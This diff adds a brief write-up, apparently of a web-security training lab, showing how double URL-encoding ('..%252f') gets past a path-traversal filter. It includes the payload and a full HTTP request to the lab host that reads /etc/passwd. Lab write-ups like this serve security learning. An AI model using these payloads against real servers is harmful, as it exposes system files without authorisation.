@@ -1,0 +1,23 @@
+File path traversal, traversal sequences stripped with superfluous URL-decode
+
+This time we're dealing with URL encoding, but we'll need to use double encoding. This payload works:
+
+..%252f..%252f..%252fetc/passwd
+
+%252f is the double encoding of /
+You can test it here:
+https://www.urlencoder.org/
+
+Request:
+
+GET /image?filename=..%252f..%252f..%252fetc/passwd HTTP/1.1
+Host: acc31ff01f89de5380010f6f004800a9.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Cookie: session=39UCcxjj9NZzwD1iU5Zq9PZ5Uk9BHpum
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
